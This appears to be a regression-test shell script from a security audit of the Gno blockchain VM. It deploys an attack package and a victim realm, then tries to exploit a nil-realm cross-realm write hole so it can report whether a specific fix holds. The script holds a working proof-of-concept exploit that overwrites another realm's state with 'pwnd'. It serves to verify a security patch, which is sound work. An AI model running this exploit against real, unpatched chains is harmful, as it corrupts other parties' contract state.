#!/bin/sh
# Targets: fix(gnovm): close the nil-realm cross-realm write hole for /p/ and stdlib
# Commit: 2c7f1abe3 — PR #5758
# Vector: a /p/-init-stamped object's method ran with m.Realm==nil, disabling the
# cross-realm write check. Attacker dispatches a Mutator (int-based, no PkgID) through
# the /p/-init-stamped Dispatcher, inheriting the nil-realm context and writing to
# a /r/-stamped victim slot. After the fix, /p/ gets a frozen realm and the write
# is blocked with a "readonly tainted object" error.

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=common.sh
. "$SCRIPT_DIR/common.sh"

SUFFIX=$(date +%s)
PKGPATH_P="gno.land/p/${KEY_ADDR}/audit/nilhole${SUFFIX}"
PKGPATH_R="gno.land/r/${KEY_ADDR}/audit/nilvictim${SUFFIX}"
TMPDIR=$(mktemp -d)
trap 'rm -rf "$TMPDIR"' EXIT

echo "2c7f1abe3 — Nil-realm cross-realm write hole (/p/-init-stamped dispatcher)"
echo "   Attack pkg : $PKGPATH_P"
echo "   Victim pkg : $PKGPATH_R"

mkdir -p "$TMPDIR/p" "$TMPDIR/r"

# --- deploy /p/ attack package ---
# Dispatcher.UseMutator is called on PDispatch (a /p/-init-stamped *Dispatcher).
# EvilInt implements Mutator with an int underlying type (no PkgID anchor).
# Before 2c7f1abe3: UseMutator borrows m.Realm to nil; EvilInt.Run inherits nil;
# write to victim-stamped Slot proceeds unchecked.
# After 2c7f1abe3: UseMutator borrows m.Realm to /p/'s frozen realm; readonly check fires.
cat > "$TMPDIR/p/nilhole.gno" << EOF
package nilhole

type Slot struct{ Field string }

type Mutator interface{ Run(s *Slot) }

type Dispatcher struct{}

func (d *Dispatcher) UseMutator(s *Slot, m Mutator) { m.Run(s) }

var PDispatch = &Dispatcher{}

type EvilInt int

func (EvilInt) Run(s *Slot) { s.Field = "pwnd" }
EOF

cat > "$TMPDIR/p/gnomod.toml" << EOF
module = "${PKGPATH_P}"
gno = "0.9"
EOF

echo -n "   Deploying attack package (/p/)... "
DEPLOY_P=$(echo "$PASSWORD" | gnokey maketx addpkg \
	-pkgpath "$PKGPATH_P" -pkgdir "$TMPDIR/p" \
	-gas-fee 1000000ugnot -gas-wanted 10000000 \
	-broadcast -chainid "$CHAINID" -remote "$RPC" \
	-insecure-password-stdin \
	-home "$GNOKEY_HOME" \
	"$KEY" 2>&1)
if echo "$DEPLOY_P" | grep -q "OK!"; then echo "OK"; else
	echo "FAILED"; echo "$DEPLOY_P"; exit 1
fi

# --- deploy /r/ victim realm ---
# gSlot is /r/-stamped. Attack() passes &gSlot to PDispatch.UseMutator.
cat > "$TMPDIR/r/nilvictim.gno" << EOF
package nilvictim

import nilhole "${PKGPATH_P}"

var gSlot = nilhole.Slot{Field: "original"}

func Attack() {
	nilhole.PDispatch.UseMutator(&gSlot, nilhole.EvilInt(0))
}

func GetField() string { return gSlot.Field }
EOF

cat > "$TMPDIR/r/gnomod.toml" << EOF
module = "${PKGPATH_R}"
gno = "0.9"
EOF

echo -n "   Deploying victim realm (/r/)... "
DEPLOY_R=$(echo "$PASSWORD" | gnokey maketx addpkg \
	-pkgpath "$PKGPATH_R" -pkgdir "$TMPDIR/r" \
	-gas-fee 1000000ugnot -gas-wanted 10000000 \
	-broadcast -chainid "$CHAINID" -remote "$RPC" \
	-insecure-password-stdin \
	-home "$GNOKEY_HOME" \
	"$KEY" 2>&1)
if echo "$DEPLOY_R" | grep -q "OK!"; then echo "OK"; else
	echo "FAILED"; echo "$DEPLOY_R"; exit 1
fi

# --- trigger attack ---
# Use maketx run (not maketx call) — Attack() has no cur realm declaration (PR #5669).
cat > "$TMPDIR/attack.gno" << EOF
package main

import v "${PKGPATH_R}"

func main() { v.Attack() }
EOF

echo -n "   Calling Attack() (PDispatch.UseMutator -> EvilInt.Run -> gSlot.Field)... "
ATTACK=$(echo "$PASSWORD" | gnokey maketx run \
	-gas-fee 1000000ugnot -gas-wanted 5000000 \
	-broadcast -chainid "$CHAINID" -remote "$RPC" \
	-insecure-password-stdin \
	-home "$GNOKEY_HOME" \
	"$KEY" "$TMPDIR/attack.gno" 2>&1)

# PATCHED: VM panics with "readonly tainted" — transaction rejected
if echo "$ATTACK" | grep -qi "readonly\|tainted\|cannot.*modif"; then
	echo "✅ PATCHED — cross-realm write blocked by VM"
	exit 0
fi

if ! echo "$ATTACK" | grep -q "OK!"; then
	# Transaction rejected for unexpected reason
	echo "REJECTED (unexpected)"
	echo "$ATTACK"
	exit 1
fi

echo "OK (tx accepted — querying state)"

# Transaction succeeded — check if gSlot was corrupted
echo -n "   Querying gSlot.Field (expect 'original')... "
RESULT=$(gnokey query "vm/qeval" \
	-data "${PKGPATH_R}.GetField()" \
	-remote "$RPC" 2>&1)

if echo "$RESULT" | grep -q '"original"'; then
	echo "✅ PATCHED — gSlot unchanged despite tx success"
elif echo "$RESULT" | grep -q '"pwnd"'; then
	echo "❌ VULNERABLE — gSlot corrupted to 'pwnd' via nil-realm hole"
	exit 1
else
	echo "⚠️  UNKNOWN OUTPUT"; echo "$RESULT"; exit 1
fi
